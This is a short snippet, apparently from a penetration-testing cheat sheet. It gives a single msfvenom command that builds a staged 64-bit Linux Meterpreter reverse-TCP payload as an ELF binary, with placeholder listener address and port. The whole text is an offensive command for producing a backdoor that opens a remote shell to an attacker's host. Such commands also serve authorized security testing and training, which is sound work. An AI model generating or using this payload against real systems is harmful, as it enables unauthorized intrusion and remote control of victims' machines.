
A Linux 64bit staged Meterpreter payload:
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=<listen-IP> LPORT=<listen-port>
```
